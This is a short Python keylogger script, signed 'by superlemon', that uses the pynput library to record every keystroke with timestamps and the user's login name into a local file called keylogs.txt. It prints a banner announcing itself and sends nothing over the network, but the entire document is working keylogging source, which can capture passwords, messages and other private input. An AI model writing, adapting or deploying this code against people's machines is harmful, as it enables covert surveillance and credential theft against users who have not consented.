from pynput.keyboard import Listener
import logging
import os
import time

file = "keylogs.txt"
time = time.asctime()
username = os.getlogin()


def logstarted():
    fileos = open('keylogs.txt', 'a')
    fileos.write(
        '--keylogger started on {} by the user \'{}\'--'.format(time, username) + '\n')
    fileos.close()


logstarted()
# ascii title font: ANSI Shadow
print('''

██╗  ██╗██╗     
██║ ██╔╝██║     
█████╔╝ ██║     
██╔═██╗ ██║     
██║  ██╗███████╗
╚═╝  ╚═╝╚══════╝ by superlemon            

''')
print('--keylogger started--')
print('see logs on ./keylogs.txt')
logging.basicConfig(filename=file, level=logging.DEBUG,
                    format="%(asctime)s %(message)s")


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()
